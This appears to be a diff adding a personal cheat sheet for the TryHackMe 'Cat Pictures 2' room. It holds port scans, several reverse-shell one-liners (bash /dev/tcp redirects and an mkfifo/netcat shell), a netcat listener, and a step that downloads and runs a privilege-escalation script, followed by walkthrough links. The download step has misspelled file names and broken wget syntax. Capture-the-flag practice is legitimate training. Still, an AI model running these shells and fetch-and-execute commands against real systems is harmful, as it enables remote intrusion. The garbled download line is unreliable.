@@ -1,0 +1,36 @@
+sudo nmap -p 21,22,23,25,53,80,110,137,138,139,143,443,445,548,587,993,995,1433,1701,1723,3306,5432,8008,8443 127.0.0.1
+nmap -A 127.0.0.1
+nmap -sV -sC -p- 127.0.0.1
+
+rustscan -a 127.0.0.1
+nmap -sV -p 22,80,222,1337,3000,8080 127.0.0.1
+
+
+Shell:
+bash -c "bash -i >& /dev/tcp/127.0.0.1/9000 0>&1"
+bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
+bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f
+
+nc -lnvp 1234
+
+whoami
+uname -a
+ls 
+ls -la
+
+python -m http.server
+wget 127.0.0.1 /lipeash.sh && chmod +x linpeas.sh && ./linpeash.sh
+
+
+https://medium.com/@krang2k/tryhackme-cat-pictures-2-46d90e57deac
+https://medium.com/@cpadlab/cat-pictures-2-thm-writeup-90580c6d6fcc
+https://github.com/wsmaxcy/Cat-Pictures-2-Writeup?tab=readme-ov-file
+https://abylin.medium.com/cat-pictures-2-tryhackme-walkthrough-51e0425184e4
+
+
+
+
+
+
+
